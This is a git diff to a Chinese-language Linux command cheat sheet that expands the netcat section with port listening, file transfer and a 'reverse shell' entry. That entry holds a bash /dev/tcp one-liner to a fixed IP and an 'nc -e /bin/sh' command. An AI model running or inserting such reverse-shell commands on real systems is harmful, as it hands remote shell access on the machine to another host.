@@ -78,13 +78,29 @@ sed -i "s/abc/xyz/g" input
 ## unique
 ## du/df
 ## nc
-1. tcp example
+1. 端口监听
 ```shell
 # server
 nc -lvp port
 # client
 nc address port
 ```
+
+2. 反弹shell
+```shell
+# bash 也能反弹shell
+# bash -i >& /dev/tcp/192.168.160.140/23333 0>&1
+nc ip port -e /bin/sh
+```
+
+3. 文件传输
+```shell
+# server
+nc -l 8099 > accept_filename
+# client
+nc  server_IP 8099 < send_filename
+```
+
 ## screen
 
 	功能和tmux重复，可以直接学习tmux.
